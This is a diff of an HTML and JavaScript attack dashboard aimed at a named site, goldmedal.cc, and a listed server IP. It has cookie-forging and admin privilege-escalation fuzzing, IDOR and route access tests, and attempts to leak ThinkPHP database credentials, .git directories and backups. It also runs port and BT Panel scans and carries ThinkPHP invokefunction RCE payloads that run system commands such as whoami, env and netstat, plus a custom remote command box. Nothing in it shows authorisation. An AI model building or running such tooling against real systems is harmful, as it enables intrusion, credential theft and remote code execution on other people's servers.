+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon blue">🎯</div>
+                            <span>API Endpoint Fuzzing</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Brute-force API endpoints with GET/POST methods to discover hidden functionality.</p>
+                        <button class="btn-primary" onclick="fuzzAPIs()">🧪 Fuzz All API Endpoints</button>
+                        <div class="output-area" id="apiFuzzOutput">Results will appear here...</div>
+                    </div>
+                </div>
+
+                <!-- Path Brute-force -->
+                <div class="tool-card info-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon blue">📁</div>
+                            <span>Path & Directory Discovery</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Brute-force common paths, admin panels, and hidden directories.</p>
+                        <button class="btn-primary" onclick="brutePaths()">🔎 Brute-force Paths</button>
+                        <div class="output-area" id="bruteOutput">Results will appear here...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: AUTH & COOKIES -->
+        <div class="tab-content" id="tab-auth">
+            <div class="tools-grid">
+                <!-- Cookie Manipulation -->
+                <div class="tool-card purple-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon purple">🍪</div>
+                            <span>Cookie Manipulation & Privilege Escalation</span>
+                        </div>
+                        <span class="tag high">Auth Bypass</span>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Found cookie: <code>username=TWFydWZiZWxheQ==</code> (decoded: <b>Marufbelay</b>)</p>
+                        <div class="input-group">
+                            <input type="text" id="cookieValue" value="admin" placeholder="Cookie value to test">
+                            <input type="text" id="cookieEncoded" value="YWRtaW4=" readonly placeholder="Encoded">
+                        </div>
+                        <div class="btn-group">
+                            <button class="btn-ghost btn-sm" onclick="encodeBase64()">🔄 Encode Base64</button>
+                            <button class="btn-purple btn-sm" onclick="testCookie()">🧪 Test Single</button>
+                            <button class="btn-purple btn-sm" onclick="huntCookies()">🎯 Fuzz All Values</button>
+                        </div>
+                        <div class="output-area" id="cookieOutput">Cookie test results...</div>
+                    </div>
+                </div>
+
+                <!-- IDOR Testing -->
+                <div class="tool-card purple-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon purple">🆔</div>
+                            <span>IDOR (Insecure Direct Object Reference)</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Test routes with manipulated IDs to find unauthorized access.</p>
+                        <button class="btn-purple" onclick="testIDOR()">🔍 Test IDOR Vulnerabilities</button>
+                        <div class="output-area" id="idorOutput">IDOR test results...</div>
+                    </div>
+                </div>
+
+                <!-- Vue Routes Access -->
+                <div class="tool-card purple-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon purple">🗺️</div>
+                            <span>Vue Route Access Control Test</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Test all 42+ Vue routes with and without authentication cookies.</p>
+                        <button class="btn-purple" onclick="testVueRoutes()">🔓 Test All Routes</button>
+                        <div class="output-area" id="vueRoutesOutput">Route access test results...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: RECON & HEADERS -->
+        <div class="tab-content" id="tab-recon">
+            <div class="tools-grid">
+                <!-- BT Panel -->
+                <div class="tool-card danger-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon red">🖥️</div>
+                            <span>BT Panel & Server Access</span>
+                        </div>
+                        <span class="tag critical">Target: 31.59.114.216</span>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Check BT Panel accessibility and scan common server ports.</p>
+                        <div class="btn-group">
+                            <button class="btn-danger btn-sm" onclick="huntBTPanel()">🔍 Check BT Panel</button>
+                            <button class="btn-danger btn-sm" onclick="huntPorts()">🔌 Full Port Scan</button>
+                        </div>
+                        <div class="output-area" id="btOutput">Port scan results...</div>
+                    </div>
+                </div>
+
+                <!-- Security Headers -->
+                <div class="tool-card info-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon blue">🛡️</div>
+                            <span>Security Headers Analysis</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Check for missing security headers, cookie flags, and information disclosure.</p>
+                        <button class="btn-primary" onclick="checkHeaders()">🔍 Analyze Headers</button>
+                        <div class="output-area" id="headersOutput">Header analysis results...</div>
+                    </div>
+                </div>
+
+                <!-- Desktop Bypass -->
+                <div class="tool-card info-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon blue">🖥️</div>
+                            <span>Desktop Mode Bypass</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Test if desktop User-Agent reveals different content than mobile.</p>
+                        <button class="btn-primary" onclick="desktopBypass()">🔄 Test Desktop UA</button>
+                        <div class="output-area" id="desktopBypassOutput">Desktop bypass results...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: VUE.JS ANALYSIS -->
+        <div class="tab-content" id="tab-vue">
+            <div class="tools-grid">
+                <!-- Vue Source Extraction -->
+                <div class="tool-card cyan-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon cyan">🔬</div>
+                            <span>Vue.js Source Code Analysis</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Extract endpoints, routes, tokens, and hidden functions from compiled JS files.</p>
+                        <div class="btn-group">
+                            <button class="btn-primary btn-sm" onclick="extractJS()">📥 Extract All</button>
+                            <button class="btn-ghost btn-sm" onclick="viewAppJS()">👁️ View app.js</button>
+                        </div>
+                        <div class="output-area" id="jsOutput">JS analysis results...</div>
+                    </div>
+                </div>
+
+                <!-- Vue Inspector Commands -->
+                <div class="tool-card cyan-card">
+                    <div class="tool-header">
+                        <div class="tool-title">
+                            <div class="tool-icon cyan">🎯</div>
+                            <span>Vue.js Live Inspector Guide</span>
+                        </div>
+                    </div>
+                    <div class="tool-body">
+                        <p class="tool-desc">Console commands to inspect Vue app state, Vuex store, and router on the live site.</p>
+                        <button class="btn-primary" onclick="getVueCommands()">📋 Get Console Commands</button>
+                        <div class="output-area" id="vueCommandsOutput">Commands will appear here...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB: FINDINGS LOG -->
+        <div class="tab-content" id="tab-findings">
+            <div class="findings-container">
+                <div class="findings-header">
+                    <h3 style="font-size:1em;">📋 Security Findings Log</h3>
+                    <div class="btn-group">
+                        <button class="btn-ghost btn-sm" onclick="exportLog()">📥 Export JSON</button>
+                        <button class="btn-ghost btn-sm" onclick="copyLog()">📋 Copy All</button>
+                        <button class="btn-ghost btn-sm" onclick="clearLog()">🗑️ Clear Log</button>
+                    </div>
+                </div>
+                <div class="findings-list" id="findingsList">
+                    <div class="finding-item">
+                        <span class="finding-time">--:--:--</span>
+                        <span class="finding-severity">⚪</span>
+                        <span class="finding-message">Session started. Waiting for scans...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
     </div>
 
-    <!-- Quick Stats -->
-    <div class="stats">
-        <div class="stat-box">
-            <div class="number" id="totalEndpoints">0</div>
-            <div class="label">Endpoints Found</div>
-        </div>
-        <div class="stat-box">
-            <div class="number" id="criticalFindings">0</div>
-            <div class="label">Critical Findings</div>
-        </div>
-        <div class="stat-box">
-            <div class="number" id="serverStatus">⬤</div>
-            <div class="label">Server Status</div>
-        </div>
-    </div>
+    <!-- TOAST CONTAINER -->
+    <div class="toast-container" id="toastContainer"></div>
 
-    <!-- Card Grid -->
-    <div class="grid">
-
-        <!-- 1. Proxy Tester -->
-        <div class="card info-card">
-            <h2><span class="icon">🌐</span> Request Proxy</h2>
-            <div class="flex-row">
-                <input type="text" id="proxyPath" value="/index.php" placeholder="Path">
-                <select id="proxyMethod">
-                    <option>GET</option>
-                    <option>POST</option>
-                </select>
-            </div>
-            <input type="text" id="proxyCookie" placeholder="Cookie value (auto base64 encoded)">
-            <input type="text" id="proxyPostData" placeholder="POST data (JSON or form data)">
-            <button onclick="sendProxy()">🚀 Send Request</button>
-            <div class="output" id="proxyOutput">Ready. Enter a path and send.</div>
-        </div>
-
-        <!-- 2. Cookie Manipulation -->
-        <div class="card purple-card">
-            <h2><span class="icon">🍪</span> Cookie Manipulation</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                Found: <code>username=TWFydWZiZWxheQ==</code> → <b>Marufbelay</b>
-            </p>
-            <div class="flex-row">
-                <input type="text" id="cookieValue" value="admin" placeholder="Try: admin, root">
-                <input type="text" id="cookieEncoded" value="YWRtaW4=" readonly>
-            </div>
-            <button onclick="encodeBase64()">🔄 Encode</button>
-            <button class="purple" onclick="testCookie()">🧪 Test Single Cookie</button>
-            <button class="purple" onclick="huntCookies()">🎯 Fuzz All Cookies</button>
-            <div class="output" id="cookieOutput">Cookie test results...</div>
-        </div>
-
-        <!-- 3. ThinkPHP Config Leak -->
-        <div class="card warning-card">
-            <h2><span class="icon">🗄️</span> Hunt: Database Config</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                Attempt to leak database credentials via ThinkPHP config
-            </p>
-            <button class="warning" onclick="huntDB()">🔓 Leak Database Config</button>
-            <div class="output" id="dbOutput">Click to attempt config extraction...</div>
-        </div>
-
-        <!-- 4. RCE Payloads -->
-        <div class="card danger-card">
-            <h2><span class="icon">☠️</span> Hunt: RCE Payloads</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                ThinkPHP 5.1.41 - CVE-2018-20062 & others
-            </p>
-            <button class="danger" onclick="huntRCE()">💣 Fire All RCE Payloads</button>
-            <div class="flex-row">
-                <button class="danger" onclick="quickRCE('phpinfo')">PHP Info</button>
-                <button class="danger" onclick="quickRCE('whoami')">Whoami</button>
-                <button class="danger" onclick="quickRCE('ls')">List Files</button>
-            </div>
-            <div class="output" id="rceHuntOutput">RCE test results...</div>
-        </div>
-
-        <!-- 5. .git Leak -->
-        <div class="card warning-card">
-            <h2><span class="icon">📂</span> Hunt: .git Exposure</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                Check if .git directory is publicly accessible
-            </p>
-            <button class="warning" onclick="huntGit()">🔍 Check .git Leak</button>
-            <div class="output" id="gitOutput">Results...</div>
-        </div>
-
-        <!-- 6. Backup Files -->
-        <div class="card warning-card">
-            <h2><span class="icon">📦</span> Hunt: Backup Files</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                Search for exposed backup archives and SQL dumps
-            </p>
-            <button class="warning" onclick="huntBackups()">📥 Search Backup Files</button>
-            <div class="output" id="backupOutput">Results...</div>
-        </div>
-
-        <!-- 7. BT Panel -->
-        <div class="card danger-card">
-            <h2><span class="icon">🖥️</span> Hunt: BT Panel Access</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                Target IP: <code>31.59.114.216</code> | Path: <code>/www/wwwroot/</code>
-            </p>
-            <div class="flex-row">
-                <button class="danger" onclick="huntBTPanel()">🔍 Check BT Panel</button>
-                <button class="danger" onclick="huntPorts()">🔌 Scan Ports</button>
-            </div>
-            <div class="output" id="btOutput">Results...</div>
-        </div>
-
-        <!-- 8. Path Brute-force -->
-        <div class="card info-card">
-            <h2><span class="icon">📁</span> Path Discovery</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                Brute-force common paths and endpoints
-            </p>
-            <button onclick="brutePaths()">🔎 Brute Common Paths</button>
-            <div class="output" id="bruteOutput">Path scan results...</div>
-        </div>
-
-        <!-- 9. Custom RCE Command -->
-        <div class="card danger-card">
-            <h2><span class="icon">💀</span> Custom RCE Command</h2>
-            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
-                Execute custom system command if RCE is found
-            </p>
-            <div class="flex-row">
-                <input type="text" id="customCmd" value="id" placeholder="Command: id, whoami, ls -la">
-                <button class="danger" onclick="customRCE()">Execute</button>
-            </div>
-            <div class="output" id="customRCEOutput">Enter a command...</div>
-        </div>
-
-        <!-- 10. Findings Log -->
-        <div class="card" style="grid-column: 1 / -1;">
-            <h2><span class="icon">📋</span> Findings Log</h2>
-            <button onclick="clearLog()" style="width:auto;display:inline-block;margin-bottom:8px;">🗑️ Clear Log</button>
-            <div class="output" id="findingsLog" style="min-height:100px;">
-                Session started...
-            </div>
-        </div>
-
+    <!-- MODAL OVERLAY (Hidden by default) -->
+    <div class="modal-overlay" id="modalOverlay" style="display:none;">
+        <div class="modal" id="modalContent"></div>
     </div>
 
     <script>
+        // ============================================================
+        // CONFIGURATION
+        // ============================================================
         const BASE = window.location.origin;
+        const TARGET = 'goldmedal.cc';
         let findingsCount = 0;
+        let allFindings = [];
+        let activeScans = 0;
 
-        // ============ UTILITY FUNCTIONS ============
-        function showLoading(elemId) {
-            const el = document.getElementById(elemId);
-            el.innerHTML = '⏳ <span style="color:#d2991d;">Loading...</span>';
-            el.className = 'output loading';
+        // ============================================================
+        // UTILITY FUNCTIONS
+        // ============================================================
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.3s ease';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
         }
 
-        function showResult(elemId, data, isError) {
-            const el = document.getElementById(elemId);
-            el.textContent = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
-            el.className = isError ? 'output error' : 'output';
+        function showLoading(id) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.innerHTML = '<span style="color:#d2991d;">⏳ Scanning...</span>';
+            el.className = 'output-area loading';
+            activeScans++;
+            updateScanStatus();
         }
 
-        function logFinding(message, severity) {
+        function showResult(id, data, isError = false) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            const formatted = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
+            el.innerHTML = formatted.length > 10000 ? formatted.substring(0, 10000) + '\n\n... [truncated]' : formatted;
+            el.className = isError ? 'output-area error' : 'output-area';
+            activeScans--;
+            updateScanStatus();
+        }
+
+        function updateScanStatus() {
+            const statusEl = document.getElementById('serverStatusText');
+            if (activeScans > 0) {
+                statusEl.textContent = `Scanning (${activeScans} active)...`;
+                document.getElementById('serverStatusDot').className = 'status-dot';
+                document.getElementById('serverStatusDot').style.background = '#d2991d';
+            } else {
+                statusEl.textContent = 'Idle';
+                document.getElementById('serverStatusDot').className = 'status-dot online';
+            }
+        }
+
+        function logFinding(message, severity = 'info') {
             findingsCount++;
-            const log = document.getElementById('findingsLog');
             const time = new Date().toLocaleTimeString();
-            const icons = { critical: '🔴', high: '🟠', medium: '🟡', low: '🔵', info: '⚪' };
+            const icons = {
+                critical: '🔴',
+                high: '🟠',
+                medium: '🟡',
+                low: '🔵',
+                info: '⚪'
+            };
             const icon = icons[severity] || '⚪';
-            log.textContent = `[${time}] ${icon} ${message}\n` + log.textContent;
-            document.getElementById('criticalFindings').textContent = findingsCount;
+            const entry = { time, severity, message };
+            
+            allFindings.unshift(entry);
+            document.getElementById('criticalFindings').textContent = allFindings.filter(f => f.severity === 'critical').length;
+            
+            // Update findings list
+            const listEl = document.getElementById('findingsList');
+            const itemEl = document.createElement('div');
+            itemEl.className = 'finding-item';
+            itemEl.innerHTML = `
+                <span class="finding-time">${time}</span>
+                <span class="finding-severity">${icon}</span>
+                <span class="finding-message">${message}</span>
+            `;
+            
+            if (listEl.children.length > 100) {
+                listEl.removeChild(listEl.lastChild);
+            }
+            
+            if (listEl.children.length === 1 && listEl.children[0].textContent.includes('Session started')) {
+                listEl.innerHTML = '';
+            }
+            
+            listEl.insertBefore(itemEl, listEl.firstChild);
+            
+            // Show toast for critical/high
+            if (severity === 'critical' || severity === 'high') {
+                showToast(`${icon} ${message}`, severity === 'critical' ? 'error' : 'info');
+            }
         }
 
         function clearLog() {
-            document.getElementById('findingsLog').textContent = 'Session started...\n';
+            document.getElementById('findingsList').innerHTML = `
+                <div class="finding-item">
+                    <span class="finding-time">${new Date().toLocaleTimeString()}</span>
+                    <span class="finding-severity">⚪</span>
+                    <span class="finding-message">Log cleared. Session restarted.</span>
+                </div>
+            `;
+            allFindings = [];
             findingsCount = 0;
             document.getElementById('criticalFindings').textContent = '0';
+            showToast('Findings log cleared', 'info');
         }
 
-        // ============ BASE64 ENCODE ============
+        function exportLog() {
+            const data = JSON.stringify(allFindings, null, 2);
+            const blob = new Blob([data], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `security-findings-${new Date().toISOString().slice(0,10)}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast('Findings exported to JSON', 'success');
+        }
+
+        function copyLog() {
+            const text = allFindings.map(f => `[${f.time}] ${f.severity.toUpperCase()}: ${f.message}`).join('\n');
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('Findings copied to clipboard', 'success');
+            });
+        }
+
+        // ============================================================
+        // TABS LOGIC
+        // ============================================================
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                // Remove active from all tabs
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                // Activate clicked tab
+                this.classList.add('active');
+                const tabId = this.getAttribute('data-tab');
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+
+        // ============================================================
+        // COOKIE ENCODING
+        // ============================================================
         function encodeBase64() {
             const val = document.getElementById('cookieValue').value;
             try {
                 document.getElementById('cookieEncoded').value = btoa(val);
             } catch(e) {
-                document.getElementById('cookieEncoded').value = 'Encoding error: ' + e.message;
+                document.getElementById('cookieEncoded').value = 'Encoding Error';
             }
         }
         document.getElementById('cookieValue').addEventListener('input', encodeBase64);
+        encodeBase64();
 
-        // ============ PROXY REQUEST ============
+        // ============================================================
+        // PROXY REQUEST
+        // ============================================================
         async function sendProxy() {
             showLoading('proxyOutput');
             const path = document.getElementById('proxyPath').value;
@@ -515,8 +1324,8 @@
             if (cookieVal) url += `&custom_cookie=${encodeURIComponent(cookieVal)}`;
 
             try {
-                const options = { method: method };
-                if (method === 'POST' && postData) {
+                const options = { method };
+                if ((method === 'POST' || method === 'PUT' || method === 'PATCH') && postData) {
                     options.headers = { 'Content-Type': 'application/json' };
                     options.body = postData;
                 }
@@ -525,18 +1334,23 @@
                 showResult('proxyOutput', data);
                 
                 // Auto-log interesting findings
-                if (data.status_code === 200 && data.length && data.length < 500) {
-                    logFinding(`Interesting response at ${path} (${data.length} bytes)`, 'medium');
-                }
-                if (data.body && data.body.includes('password')) {
-                    logFinding(`POSSIBLE PASSWORD LEAK at ${path}!`, 'critical');
+                if (data.body) {
+                    if (data.body.includes('password') || data.body.includes('secret') || data.body.includes('token')) {
+                        logFinding(`SENSITIVE DATA in response from ${path}`, 'critical');
+                    }
+                    if (data.status_code === 200 && data.length > 100 && data.length < 5000) {
+                        logFinding(`Interesting response from ${path} (${data.length}B)`, 'medium');
+                    }
                 }
             } catch(e) {
-                showResult('proxyOutput', 'Error: ' + e.message, true);
+                showResult('proxyOutput', `Error: ${e.message}`, true);
+                showToast('Proxy request failed', 'error');
             }
         }
 
-        // ============ COOKIE TESTING ============
+        // ============================================================
+        // COOKIE OPERATIONS
+        // ============================================================
         async function testCookie() {
             showLoading('cookieOutput');
             const val = document.getElementById('cookieValue').value;
@@ -544,12 +1358,15 @@
                 const resp = await fetch(`${BASE}/test/cookie/${encodeURIComponent(val)}`);
                 const data = await resp.json();
                 showResult('cookieOutput', data);
-                
+                document.getElementById('cookieTests').textContent = parseInt(document.getElementById('cookieTests').textContent) + 1;
                 if (data.different_from_default) {
-                    logFinding(`Cookie value "${val}" produced different response!`, 'high');
+                    logFinding(`Cookie "${val}" produced different response! Potential auth bypass.`, 'high');
+                }
+                if (data.analysis?.has_admin) {
+                    logFinding(`Cookie "${val}" revealed admin content!`, 'critical');
                 }
             } catch(e) {
-                showResult('cookieOutput', 'Error: ' + e.message, true);
+                showResult('cookieOutput', `Error: ${e.message}`, true);
             }
         }
 
@@ -559,60 +1376,69 @@
                 const resp = await fetch(`${BASE}/hunt/cookie-fuzz`);
                 const data = await resp.json();
                 showResult('cookieOutput', data);
-                
-                // Log impactful findings
+                document.getElementById('cookieTests').textContent = Array.isArray(data) ? data.length : 0;
                 if (Array.isArray(data)) {
-                    data.forEach(item => {
-                        if (item.potential_impact) {
-                            logFinding(`Cookie value "${item.value}" may have privilege escalation potential!`, 'critical');
-                        }
+                    const impactful = data.filter(item => item.potential_impact);
+                    impactful.forEach(item => {
+                        logFinding(`Cookie "${item.value}" may have privilege escalation! (${item.length}B)`, 'critical');
                     });
+                    if (impactful.length === 0) {
+                        logFinding(`Tested ${data.length} cookie values. No privilege escalation found.`, 'info');
+                    }
                 }
             } catch(e) {
-                showResult('cookieOutput', 'Error: ' + e.message, true);
+                showResult('cookieOutput', `Error: ${e.message}`, true);
             }
         }
 
-        // ============ DATABASE CONFIG ============
+        // ============================================================
+        // DATABASE CONFIG
+        // ============================================================
         async function huntDB() {
             showLoading('dbOutput');
             try {
                 const resp = await fetch(`${BASE}/hunt/thinkphp-config`);
                 const data = await resp.json();
                 showResult('dbOutput', data);
-                
                 if (Array.isArray(data)) {
                     data.forEach(item => {
-                        if (item.snippet && item.snippet.includes('password')) {
-                            logFinding('DATABASE CREDENTIALS MAY BE EXPOSED!', 'critical');
+                        if (item.has_sensitive_data) {
+                            logFinding('DATABASE CONFIGURATION MAY BE EXPOSED!', 'critical');
+                            if (item.sensitive_found?.password) {
+                                logFinding(`Database password found!`, 'critical');
+                            }
                         }
-                        if (item.snippet && item.snippet.includes('hostname')) {
-                            logFinding(`Database hostname found: check results`, 'high');
+                        if (item.snippet?.includes('hostname')) {
+                            logFinding('Database hostname found', 'high');
                         }
                     });
                 }
             } catch(e) {
-                showResult('dbOutput', 'Error: ' + e.message, true);
+                showResult('dbOutput', `Error: ${e.message}`, true);
             }
         }
 
-        // ============ RCE PAYLOADS ============
+        // ============================================================
+        // RCE OPERATIONS
+        // ============================================================
         async function huntRCE() {
             showLoading('rceHuntOutput');
             try {
                 const resp = await fetch(`${BASE}/hunt/rce-payloads`);
                 const data = await resp.json();
                 showResult('rceHuntOutput', data);
-                
+                document.getElementById('rceAttempts').textContent = Array.isArray(data) ? data.length : 0;
                 if (Array.isArray(data)) {
-                    data.forEach(item => {
-                        if (item.status === 200 && item.length > 100) {
-                            logFinding(`Potential RCE! Payload returned ${item.length} bytes`, 'critical');
-                        }
+                    const rceFound = data.filter(item => item.potential_rce);
+                    rceFound.forEach(item => {
+                        logFinding(`POTENTIAL RCE! Payload returned ${item.length} bytes. Indicators: ${item.indicators?.join(', ') || 'none'}`, 'critical');
                     });
+                    if (rceFound.length === 0) {
+                        logFinding(`Tested ${data.length} RCE payloads. No immediate success detected.`, 'info');
+                    }
                 }
             } catch(e) {
-                showResult('rceHuntOutput', 'Error: ' + e.message, true);
+                showResult('rceHuntOutput', `Error: ${e.message}`, true);
             }
         }
 
@@ -622,17 +1448,21 @@
                 'phpinfo': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
                 'whoami': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
                 'ls': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-la',
+                'id': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
+                'env': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env',
+                'netstat': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat%20-an',
             };
             try {
                 const resp = await fetch(`${BASE}/proxy?path=${encodeURIComponent(payloads[type])}`);
                 const data = await resp.json();
                 showResult('rceHuntOutput', data);
-                
-                if (data.status_code === 200 && data.length > 50) {
-                    logFinding(`RCE test "${type}" returned data! Possible command execution.`, 'critical');
+                document.getElementById('rceAttempts').textContent = parseInt(document.getElementById('rceAttempts').textContent) + 1;
+                if (data.status_code === 200 && data.length > 50 && !data.body?.includes('module not exists')) {
+                    logFinding(`Quick RCE "${type}" returned ${data.length} bytes! Possible execution!`, 'critical');
+                    showToast(`Possible RCE detected: ${type}`, 'error');
                 }
             } catch(e) {
-                showResult('rceHuntOutput', 'Error: ' + e.message, true);
+                showResult('rceHuntOutput', `Error: ${e.message}`, true);
             }
         }
 
@@ -644,77 +1474,81 @@
                 const resp = await fetch(`${BASE}/proxy?path=${encodeURIComponent(payload)}`);
                 const data = await resp.json();
                 showResult('customRCEOutput', data);
-                
                 if (data.status_code === 200 && data.length > 20) {
-                    logFinding(`Custom RCE "${cmd}" executed! Check output.`, 'critical');
+                    logFinding(`Custom RCE "${cmd}" executed! Response: ${data.length} bytes`, 'critical');
+                    showToast('Command executed successfully!', 'error');
                 }
             } catch(e) {
-                showResult('customRCEOutput', 'Error: ' + e.message, true);
+                showResult('customRCEOutput', `Error: ${e.message}`, true);
             }
         }
 
-        // ============ .GIT LEAK ============
+        // ============================================================
+        // .GIT & BACKUP DISCOVERY
+        // ============================================================
         async function huntGit() {
             showLoading('gitOutput');
             try {
                 const resp = await fetch(`${BASE}/hunt/git-leak`);
                 const data = await resp.json();
                 showResult('gitOutput', data);
-                
                 if (Array.isArray(data)) {
-                    data.forEach(item => {
-                        if (item.status === 200) {
-                            logFinding(`.git LEAK! ${item.path} is accessible! Source code exposed.`, 'critical');
-                        }
+                    const exposed = data.filter(item => item.status === 200);
+                    exposed.forEach(item => {
+                        logFinding(`.git LEAK! ${item.path} accessible (${item.length}B)`, 'critical');
                     });
+                    if (exposed.length === 0) {
+                        logFinding('No .git exposure detected.', 'info');
+                    }
                 }
             } catch(e) {
-                showResult('gitOutput', 'Error: ' + e.message, true);
+                showResult('gitOutput', `Error: ${e.message}`, true);
             }
         }
 
-        // ============ BACKUP FILES ============
         async function huntBackups() {
             showLoading('backupOutput');
             try {
                 const resp = await fetch(`${BASE}/hunt/backup-files`);
                 const data = await resp.json();
                 showResult('backupOutput', data);
-                
                 if (Array.isArray(data)) {
                     data.forEach(item => {
-                        if (item.status === 200 && item.length > 1000) {
-                            logFinding(`BACKUP FILE FOUND: ${item.file} (${item.length} bytes)!`, 'critical');
+                        if (item.size > 1000) {
+                            logFinding(`BACKUP/SENSITIVE FILE: ${item.file} (${item.size_kb}KB)`, 'critical');
                         } else if (item.status === 200) {
                             logFinding(`File found: ${item.file}`, 'medium');
                         }
                     });
+                    if (data.length === 0) {
+                        logFinding('No exposed backup files found.', 'info');
+                    }
                 }
             } catch(e) {
-                showResult('backupOutput', 'Error: ' + e.message, true);
+                showResult('backupOutput', `Error: ${e.message}`, true);
             }
         }
 
-        // ============ BT PANEL ============
+        // ============================================================
+        // BT PANEL & PORTS
+        // ============================================================
         async function huntBTPanel() {
             showLoading('btOutput');
             try {
                 const resp = await fetch(`${BASE}/hunt/bt-panel`);
                 const data = await resp.json();
                 showResult('btOutput', data);
-                
                 if (Array.isArray(data)) {
-                    data.forEach(item => {
-                        if (item.has_bt_keyword) {
-                            logFinding(`BT Panel detected at ${item.url}!`, 'critical');
-                        }
-                        if (item.status === 200) {
-                            logFinding(`Open port found: ${item.url}`, 'high');
-                        }
+                    const btFound = data.filter(item => item.is_bt_panel);
+                    btFound.forEach(item => {
+                        logFinding(`BT Panel detected at ${item.url}!`, 'critical');
                     });
+                    if (btFound.length === 0) {
+                        logFinding('No BT Panel detected on common ports.', 'info');
+                    }
                 }
             } catch(e) {
-                showResult('btOutput', 'Error: ' + e.message, true);
+                showResult('btOutput', `Error: ${e.message}`, true);
             }
         }
 
@@ -724,113 +1558,273 @@
                 const resp = await fetch(`${BASE}/hunt/scan-common-ports`);
                 const data = await resp.json();
                 showResult('btOutput', data);
-                
                 if (Array.isArray(data)) {
                     const openPorts = data.filter(p => p.open);
+                    document.getElementById('openPorts').textContent = openPorts.length;
                     openPorts.forEach(p => {
-                        logFinding(`OPEN PORT: ${p.port} on 31.59.114.216`, 'high');
+                        logFinding(`OPEN PORT: ${p.port} (${p.service})`, 'high');
+                        if (p.http_response) {
+                            logFinding(`HTTP on port ${p.port}: ${p.http_response.status} - ${p.http_response.title || 'No title'}`, 'medium');
+                        }
                     });
                     if (openPorts.length === 0) {
-                        logFinding('No common ports open (may be firewalled)', 'info');
+                        logFinding('No common ports open (likely firewalled)', 'info');
                     }
                 }
             } catch(e) {
-                showResult('btOutput', 'Error: ' + e.message, true);
+                showResult('btOutput', `Error: ${e.message}`, true);
             }
         }
 
-        // ============ PATH BRUTE-FORCE ============
+        // ============================================================
+        // VUE ROUTES & API
+        // ============================================================
+        async function testVueRoutes() {
+            showLoading('vueRoutesOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/vue-routes`);
+                const data = await resp.json();
+                showResult('vueRoutesOutput', data);
+                if (Array.isArray(data)) {
+                    const accessibleNoAuth = data.filter(item => 
+                        item.auth === 'NO COOKIE' && item.status === 200 && item.length > 500
+                    );
+                    accessibleNoAuth.forEach(item => {
+                        logFinding(`ACCESSIBLE WITHOUT AUTH: ${item.route} (${item.length}B)`, 'critical');
+                    });
+                    if (accessibleNoAuth.length === 0) {
+                        logFinding('All tested routes require authentication.', 'info');
+                    } else {
+                        logFinding(`${accessibleNoAuth.length} routes accessible without authentication!`, 'critical');
+                    }
+                }
+            } catch(e) {
